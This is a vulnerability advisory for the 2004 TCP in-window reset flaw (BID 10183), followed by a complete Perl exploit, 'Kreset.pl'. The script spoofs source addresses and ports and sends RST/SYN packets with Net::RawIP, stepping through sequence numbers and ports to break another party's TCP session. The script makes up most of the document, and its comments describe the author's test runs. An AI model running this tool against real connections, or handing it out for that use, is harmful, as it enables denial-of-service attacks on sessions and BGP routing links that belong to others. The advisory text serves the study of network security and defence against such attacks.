source: http://www.securityfocus.com/bid/10183/info
   
A vulnerability in TCP implementations may permit unauthorized remote users to reset TCP sessions. This issue affects products released by multiple vendors. Exploiting this issue may permit remote attackers to more easily approximate TCP sequence numbers.
   
The problem is that affected implementations will accept TCP sequence numbers within a certain range of the expected sequence number for a packet in the session. This will permit a remote attacker to inject a SYN or RST packet into the session, causing it to be reset and effectively allowing denial-of-service attacks. An attacker would exploit this issue by sending a packet to a receiving implementation with an approximated sequence number and a forged source IP and TCP port.
   
Few factors may present viable target implementations, such as imlementations that:
   
- depend on long-lived TCP connections
- have known or easily guessed IP address endpoints
- have known or easily guessed TCP source ports.
   
Note that Border Gateway Protocol (BGP) is reported to be particularly vulnerable to this type of attack. As a result, this issue is likely to affect a number of routing platforms.
   
Note also that while a number of vendors have confirmed this issue in various products, investigations are ongoing and it is likely that many other vendors and products will turn out to be vulnerable as the issue is investigated further.
   
Other consequences may also result from this issue, such as injecting specific data in TCP sessions, but this has not been confirmed.
   
**Update: Microsoft platforms are also reported prone to this vulnerability. Vendor reports indicate that an attacker will require knowledge of the IP address and port numbers of the source and destination of an existent legitimate TCP connection in order to exploit this vulnerability on Microsoft platforms. Connections that involve persistent sessions, for example Border Gateway Protocol sessions, may be more exposed to this vulnerability than other TCP/IP sessions.

use Net::RawIP;
## Kreator -> K-sPecial [http://xzziroz.freeshell.org]
## Date -> 4-23-2004
## Name -> Kreset.pl
## Version -> 1.0
##
## Use -> Used to reset a TCP connecting.
## (Using the slipping throught he window meathod described on 4-20-04)
## DESCRIBED HERE: http://www.uniras.gov.uk/vuls/2004/236929/index.htm
##
## Usage -> If you don't fuckin know how to use it, don't use it.
##
## Other -> I played around on nix for a few hours to get the idea down
## pat. I set up an IRCD and connected to it, looked at tcpdump to
## get irssi's local port. irssi's window size was larger so I figured
## i would pretend to be sending RST from server, irssi window 
## was around
## 30K while ircd window around 3K, big difference :D. So I enter values
## and since the connection is loop back, i used 0.0 seconds between
## packets.
## it only took a few minutes to disconnect with a 0.0 overlay and
## a 30K window starting at sequence number 0. Only problem over
## the internet, is finding the port of each side, sure you know the
## servers port but not the clients. I got to sequence number 1512500
## using a .10 second delay and a window size of 2500. Sequence 
## numbers are 
## 32 bit numbers, 32 1's comes out to be 4294967295. 
## Do the math, and you know precisely how long it takes to cover
## every sequence RANGE of a given port using a given window size.
## Window sizes should be based on application layer program.
##
## NOTE -> This script assumes you know at least one of the ports, 
## if the case is otherwise
## then the script can easily be modified to work around this. Also,
## this was written for
## UNIX variants.

print <<EOF;
-> Kreset.pl by K-sPecial [4-23-2004]
-> Used to reset a connection based on the slipping
-> through the window meathod, exploited publicly on 4-20-2004.
-> [http://xzziroz.freeshell.org]
-> Greets: K-sPecial (myself), saevio, attila, zeedo, uzimonkey
-> eightball, unmanarc, Buuyo^, and whomever else I forgot. 
EOF

print "\r\nDo you want a port range for the source IP, or the dest IP?";
print "\r\nIf you want it for the source, type 1, otherwise 2.";
print "\r\nIf you don't want it for either, type one or the other: ";
chomp (my $choice = <STDIN>);
unless ($choice == 1 || $choice == 2) { 
	print "\r\nEnter 1, or 2.\r\n";
	exit(1);
}
print "\r\nEnter source IP: ";
chomp (my $sip = <STDIN>);
if ($choice == 2) { 
	print "\r\nEnter source port: ";
	chomp ($sport = <STDIN>);
	if (!($sport)) { 
		print "\r\nYou must fill in a source port.\r\n";
	}
}
print "\r\nEnter dest IP: ";
chomp (my $dip = <STDIN>);
if ($choice == 1) { 
	print "\r\nEnter dest port: ";
	chomp ($dport = <STDIN>);
	if (!($dport)) { 
		print "\r\nYou must fill in a destination port.\r\n";
		exit(1);
	}
}
print "\r\nEnter begin port: ";
chomp (my $bport = <STDIN>);
print "\r\nEnter end port: ";
chomp (my $eport = <STDIN>);
if (!($sip) || !($dip) || !($bport) || !($eport)) {
	print "\r\nYou forgot to fill in one or more fields.\r\n";
	exit(1); ## Yea hahah we don't exit (0) anymore. LOL
}
print "\r\nDestinations guessed window size,";
print "\r\nIf you don't define this, we will try small (2500): ";
chomp (my $winsize = <STDIN>); ## Why did the window cross the road?
if (!($winsize)) {
	$winsize = 2500;
}
print "\r\nStarting sequence number,";
print "\r\nIf you don't define this, we will start at 0: ";
chomp (my $seqnum = <STDIN>); ## So he could prevent sequence numbers
if (!($seqnum)) {	      ## from getting through!
	$seqnum = 0;
}

print "\r\nNumber of seconds to wait between each packet sent,";
print "\r\nENTER DOTTED DECIMALS HERE PRECEEDED BY A 0 TO";
print "\r\nINDICATE NO MINUTES: 0.10 == 10 ms, 0.0 = 0 ms";
print "\r\nIf you don't define this, we will use 0.10: ";
chomp (my $ms = <STDIN>);
if (!($ms)) {
	$ms = "0.10";
}

print <<EOF;

Source IP is -> $sip
Source port is -> $sport
Destination IP is -> $dip
Guessed window size is -> $winsize
Starting sequence number is -> $seqnum
Loop wait is -> $ms
Begin port is -> $bport
End port is -> $eport
EOF
print "Destination port is -> $dport\r\n" if $dport;
print "Source port is -> $sport\r\n" if $sport;
print "\r\n";

my $i = $seqnum;
## LOOKS WHATS FOLLOWS! WES ARES SO LEETS WITHS OURS SELECTS TRICKSES!
## P.S K-sPecial's hopes yours usings a nix variants or this selects
## tricks just mights nots works.
for ($i; 1; $i += $winsize) { 
	if ($i > 4294967295) { 
		$bport++;
		if ($bport > $eport) { 
			print "Finished\r\n";
			exit(0);
		}
		else {
			print "Looping next port.\r\n";
			$i = $seqnum;
			sleep(2);
			next;
		}
	}
	if ($choice == 2) { 
		$dport = $bport;
	}
	else { 
		$sport = $bport;
	}
	
	select(undef, undef, undef, $ms);
	print "Sequence Number is -> $i port is -> $bport\r\n";

	 $a = new Net::RawIP;
         $a->set({ip => {saddr => "$sip",daddr => "$dip"},
                  tcp => {source => $sport,dest => $dport,rst => 1,
		  syn => 1, seq => $i}}) ;


$a->send;
}
